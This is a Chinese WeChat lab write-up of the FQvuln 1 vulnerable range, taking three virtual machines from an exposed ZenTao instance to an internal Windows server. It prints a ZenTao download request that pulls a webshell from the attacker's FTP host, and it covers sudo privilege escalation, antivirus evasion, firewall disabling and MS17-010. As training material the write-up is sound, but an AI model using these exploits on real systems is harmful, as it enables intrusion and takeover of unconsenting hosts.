> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/4X-XlpgYxjYgFFK_hUe4pA)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**前言**

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

FQvuln靶场是风起原创漏洞靶场，集成了各种安全漏洞，适合在学习过程中检验自身渗透能力。目前FQvuln 1已经发布，难度相对适中。拓扑图如下：

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**环境搭建**

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

镜像下载链接：https://pan.baidu.com/s/1d64CMFCOZMeWJ8V9BtyKuQ  

提取码：l3zy  
推荐使用Vmware配置使用，网卡配置信息如拓扑图所示。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

添加网络VMnet2、VMnet3 配置类型为仅主机模式，子网地址分别为Target1：192.168.42.0/24 ，Target2：192.168.43.0/24。

Target 1配置如下:

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

因为这里Target1模拟为对外项目管理系统，需要外网可以进行访问，所以网络适配器设置为NAT模式方便测试。网络适配器2设置为VMnet2，为第一层内网IP。

Target 2 配置如下

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

该主机为OA管理系统，网络适配器设置为自定义VMnet2，网络适配器2为VMnet3，这里VMnet3代表第二层内网段，是内网用户所在区域。P.S.如果这里配置第二块网卡发现只识别了一个IP，那么则可以添加第三块网卡配置VMnet3，只是存在这个可能，望注意。

Target 3 配置如下

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

Target3仅需要配置一块网卡，为VMnet3即可，为内网用户主机。

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**Web打点渗透**

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

如果您是第一次复现该靶机，这里建议先独立渗透一遍，然后再根据个人情况浏览下文，效果会更好一些，当然以下仅作参考。

*   ### **信息收集**
    

首先对目标主机进行扫描，确定配置的IP的是多少。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

这里我们可以得到Tagrte1靶机的MAC地址为：00:0C:29:29:65:F7，然后使用nmap -sn 192.168.174.0/24对该网段进行扫描，得到目标靶机的IP地址为：192.168.174.132

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

然后我们对192.168.174.132进行扫描，使用命令nmap -T4 -sV -O 192.168.174.132

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

我们可以得到信息如下：  
开放端口：80(Apache)、3306(MySQL)  
操作系统：Linux(Ubuntu)  
MAC地址：00:0C:29:29:65:F7

首先访问http://192.168.174.132 界面如下：

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

这里通过Wappalyzer得到信息与上面基本一致。我们可以知道这是一个禅道搭建的项目管理系统，通过F12我们可以在前端中得到该版本为V12.4.2，以及第一个提示。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

搜索关于禅道V12.4.2的相关漏洞，得到在该版本存在一个任意文件下载漏洞，然后我们进行复现。

*   ### **漏洞复现**
    

但是发现该漏洞需要后台权限，然后通过FUZZ发现禅道会对登录次数进行限制，所以爆破基本是不太可能的。那么我们根据提示在github上搜索WebExploit项目管理系统。发现得到了备份文件。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

通过对备份文件的审计，我们得到禅道的数据库配置文件为：/zentaopms/config/my.php

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

得到数据库用户名为:target1 密码：qwer123!@#，在之前的信息收集我们可以得知3306端口对外开放，那么我们进行尝试连接，发现成功连接数据库。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

于是我们检索数据库配置文件发现，后台用户密码hash，然后进行破解得到后台用户名及密码。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

破解结果

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

得到用户名：admin 密码：qazwsx123  
利用得到的账号密码成功登录至后台。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

右上角有提示

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

既然拿到后台权限那么我们开始GETSHELL吧！

开启一个FTP服务，这里使用python模块开启，命令：python -m pyftpdlib -d /root/ftp -p 21 注意提前在/root/ftp目录下存放webshell文件。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

如上图已经成功开启服务。  
FTP webshell地址为ftp://192.168.174.128/shell.php 然后将其地址进行base64加密。  
然后构建payload并进行访问：  
http://192.168.174.132/zentaopms/www/index.php?m=client&f=download&version=1&link=ZnRwOi8vMTkyLjE2OC4xNzQuMTI4L3NoZWxsLnBocA==  
显示保存成功。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

Webshell连接地址：http://192.168.174.132/data/client/1/shell.php

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

连接成功！  
查看shell权限为www-data

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

常规操作sudo -l看一下

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

可以看到可以无需密码以任何权限执行/var/www/html/zentaopms/www/tips.sh文件。  
我们来尝试在文件中写入whoami并执行试一下。发现没有这个文件？不要紧，我们可以自己创建一个然后chmod +x /var/www/html/zentaopms/www/tips.sh赋予执行权限。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

然后我们可以全局搜索一下flag相关的文件名。  
在文件中写入find / -name "*flag*"并执行。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

然后查看flag文件，在文件中写入cat /root/flag1.txt并执行。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

得到第一个靶标！

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**内网渗透OA系统**

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

*   ### **信息收集**
    

为了方便测试我们弹一个meterpreter，生成方法百度即可。P.S.这里建议使用上述的提权方式弹一个root权限的shell。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

查看到该靶机存在其他内网段，添加路由。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

挂一个socks4a代理。然后在本地上配置Proxifier进行探测。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

Proxifier配置如下（嗯，为啥是Socks5了？因为我重新配了呗）：

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

发现192.168.42.129开放了80端口，因为我们在本地配置了代理，那么直接访问即可，发现是一个通达OA系统。这里建议在配置Proxifier时在代理规则处仅代理需要使用的程序即可，不然代理可能会崩。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

看到这个界面百度一下风起的通达EXP，直接秒就行，不用犹豫。这里需要注意的是，对于通达OA的shell如果是手动复现，不能是一句话木马，可以使用调用windows COM组件的webshell或者具有一定混淆功能的木马。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

然后连接webshell，查看用户权限为oa-pc\oa

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

如下图，我们可以得到这是一台windows7主机以及相关配置信息。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

继续信息收集，查看是否存在杀软，命令:tasklist /svc，在线查询一下，发现存在火绒以及D盾，所以这也明确了，这是本靶场难度较高的一环，难在我们需要熟悉免杀技术，与绝大数靶场不同，这也是最贴近真实的一个细节。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

当然这里我装的是火绒的杀毒软件，熟悉免杀的小伙伴都知道，这个是比较容易过的杀软了，我觉得免杀技术最重要的还是编程技术，如果说免杀所需的代码不能独立完成的话，建议重新学习一下编程，这在整个渗透测试的环节很重要的，也是区别于脚本小子和白帽的一个分水岭。所以笔者也建议可以加强代码的学习，如果觉得会编程技术，但是还是写不出来，那还应继续学习多思考。

*   ### **横向测试**
    

下面言归正传，上传免杀msf木马，获得一个meterpreter会话。这里需要注意因为target2不出网，所以我们需要使用正向连接的payload。  
P.S.相信操作到这一步的时候，大部分小伙伴会好奇为啥弹不回shell？那么这里提示一下，为啥不看看windows防火墙是否开启呢？那么该怎么做不用多说了吧

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

提权至system权限后，使用命令全局检索C盘下的flag相关的文件名。  
命令:dir /s /b c:*flag*

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

得到第二个靶标！  
当然这里有一个小提示就是在关闭Windows防火墙后为什么不试着再看一遍开放端口呢？攻击的方式不止一个。

在获取到OA系统权限后，继续查看是否存在其他网段。发现存在192.168.43.0/24网段，进行探测存活主机。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

探测结果如下：

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

发现一个192.168.43.128的主机  
继续我们对目标主机进行端口扫描以及操作系统探测。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**拿下内网主机**

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

发现开放445端口，并且操作系统是windows server 2008，那么直接盲打一波MS17-010。主机载荷使用正向连接哦，因为目标主机不出网。当然这里不建议使用msf的exp，因为很不稳定，成功率较低，可以使用python版的exp进行攻击，这里为了方便演示使用的msf。

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

获得最后一个靶标！

渗透结束。

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**后记**

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

本靶场不进行任何盈利活动，推广请标注来源。希望通过FQvuln靶场的学习能够对您有所收获，谢谢阅读！

P.S.小安是我大哥

（点击“阅读原文”查看链接）

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg== "虚线阴影分割线")

```


```


  









```

- End -  

精彩推荐

[内网渗透代理之frp的应用与改造（二）](http://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&mid=2649740618&idx=1&sn=f1d67aaeab34a0329c5b648c7982c143&chksm=888ce525bffb6c33b7ab3dab2b3627e4a29e0552323771c64d83bd6b217bed4d4ea8552dcee2&scene=21#wechat_redirect)  

[CDN 2021 完全攻击指南 （三）](http://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&mid=2649740505&idx=1&sn=795df17798fad605dbbf4393480e0f55&chksm=888ce4b6bffb6da0ecae6001bb0f3e5a2546dbcb7f287872aa94bb6a064871400104598a7bc4&scene=21#wechat_redirect)  

[内网渗透代理之frp的应用与改造（一）](http://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&mid=2649740401&idx=1&sn=f95985ad9bfad6ce9fe4f9eb561a0df1&chksm=888ce41ebffb6d083fb0fa6038c96d9898b214eef4deb5973685a783c4c1dcdff649e7a8adfe&scene=21#wechat_redirect)  

[风投巨头红杉资本遭受BEC攻击](http://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&mid=2649740266&idx=1&sn=385a815f601ef25655f79ec14e34c273&chksm=888ce385bffb6a938e281b63be69a4fc5e1c1479e30e3abb47b0dc510bdb71bfdc10a9b4c651&scene=21#wechat_redirect)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

--------------------------------------------------------------------------------------------------------------------------------

**戳“阅读原文”查看更多内容**










```